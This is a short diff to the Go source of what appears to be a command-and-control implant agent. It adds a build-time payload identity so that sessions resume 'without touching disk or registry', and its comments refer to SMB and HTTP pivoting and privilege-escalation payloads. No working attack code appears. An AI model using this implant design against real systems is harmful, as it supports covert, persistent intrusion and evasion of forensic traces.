@@ -4,6 +4,12 @@ package agent
 // inject parent_id when registering child agents (SMB pipe, HTTP pivot).
 var GlobalAgentID string
 
+// AgentPresetID is injected at build time by the server via -ldflags "-X agent.AgentPresetID=...".
+// It is the stable identity of this payload across server restarts. On first contact the agent
+// sends it as ResumeID so the server can restore the pre-registered session without touching
+// disk or registry.
+var AgentPresetID = ""
+
 // ParentAgentID is embedded in a payload created by a privesc action. A new
 // process has no runtime GlobalAgentID yet, so direct transports use this
 // build-time value when registering with the C2.
